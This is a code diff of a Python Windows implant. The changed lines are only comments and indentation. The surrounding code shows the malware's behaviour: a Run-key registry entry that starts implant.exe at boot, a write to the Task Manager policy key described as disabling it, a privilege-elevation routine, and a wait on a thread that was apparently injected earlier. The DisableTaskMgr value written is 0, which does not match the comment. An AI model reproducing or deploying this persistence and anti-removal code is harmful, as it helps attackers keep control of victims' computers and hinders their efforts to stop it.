@@ -47,20 +47,20 @@ def execute()
 	
 	ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 	
-	# Registry key
+	# Reg key to run implant at boot
 	aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
 	aKey = OpenKey(aReg, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE)
 	SetValueEx(aKey,"foobar",1, REG_SZ, PATH)
 	CloseKey(aKey)
 	
-	# Disable Task Manager
+	# Disable task manager for good measure
 	aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
 	aKey = OpenKey(aReg, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE)
 	SetValueEx(aKey,"DisableTaskMgr",1, REG_DWORD, 0)
 	CloseKey(aKey)
 
 
-# Elevate Privilege
+# Elevate privilege
 ASADMIN = "asadmin"
 
 if sys.argv[-1] != ASADMIN:
@@ -72,6 +72,6 @@ if sys.argv[-1] != ASADMIN:
 PATH = "C:\\SomeDir\\example\\implant.exe" 
 
 if os.path.isfile(PATH) and os.access(PATH, os.R_OK):
-   sys.exit(0)
+    sys.exit(0)
 else:
-	execute()
+    execute()
